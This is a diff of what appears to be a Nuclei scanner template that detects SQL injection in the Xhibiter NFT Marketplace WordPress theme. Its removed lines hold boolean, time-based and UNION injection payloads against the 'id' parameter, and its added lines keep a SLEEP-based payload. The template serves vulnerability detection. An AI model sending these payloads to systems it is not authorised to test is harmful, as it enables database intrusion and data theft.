@@ -1,52 +1,43 @@
 id: xhibiter-nft-sqli
-
 info:
-  name: Xhibiter NFT Marketplace SQL Injection
+  name: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
   author: ProjectDiscoveryAI
   severity: high
   description: |
-    Xhibiter NFT Marketplace suffers from SQL Injection vulnerability in the 'id' parameter.
-    The vulnerability allows attackers to execute various types of SQL injection attacks including
-    boolean-based blind, time-based blind, and UNION query injections.
-
+    The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL Injection vulnerability. This allows an attacker to manipulate SQL queries by injecting malicious SQL code through vulnerable input fields.
+  reference:
+    - https://www.exploit-db.com/exploits/52060
+    - https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/
+    - https://x.com/ExploitDB/status/1807782485549560196
+  classification:
+    cwe-id:
+      - CWE-89
+  metadata:
+    max-request: 2
+    publicwww-query: /wp-content/themes/xhibiter/
+  tags: nft,sqli,time-based-sqli,vuln,wordpress,wp-theme,xhibiter,xhibiter
+flow: http(1) && http(2)
 http:
-  - raw:
-      - |
-        GET /collections?id=2' AND 4182=4182 AND 'rNfD'='rNfD HTTP/1.1
-        Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "4182=4182"
+  - matchers:
+      - internal: true
         part: body
-      - type: word
+        type: word
         words:
-          - "rNfD=rNfD"
-        part: body
-
-  - raw:
+          - /wp-content/themes/xhibiter/
+    raw:
       - |
-        GET /collections?id=2' AND (SELECT 1492 FROM (SELECT(SLEEP(5)))HsLV) AND 'KEOa'='KEOa HTTP/1.1
+        GET / HTTP/1.1
         Host: {{Hostname}}
+  - matchers:
+      - condition: and
+        # digest: 4b0a00483046022100fdcf82c369760b0a2fb0f99c52cb2e9cf4753727873ba7679ebf5a4d62d8c33e0221009abee761457923afd81780876c836840f0458d05f796e0ea867002f77e8f2b4a:922c64590222798bb761d5b6d8e72950
 
-    matchers-condition: and
-    matchers:
-      - type: dsl
         dsl:
-          - "status_code == 200"
-          - "duration > 5"
-
-  - raw:
-      - |
-        GET /collections?id=2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162626271,0x655465754c50524d684f764944434458624e4e596c614b6d4a56656f495669466d4b704362666b58,0x71716a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL# HTTP/1.1
-        Host: {{Hostname}}
-
+          - status_code == 200
+          - duration>=7
+        type: dsl
     matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "qbbbq"
-          - "eTeuLPRMhOvIDCDXbNNYlaKmJVeIViFmKpCbfkX"
-        part: body
+    raw:
+      - |
+        GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
+        Host: {{Hostname}}
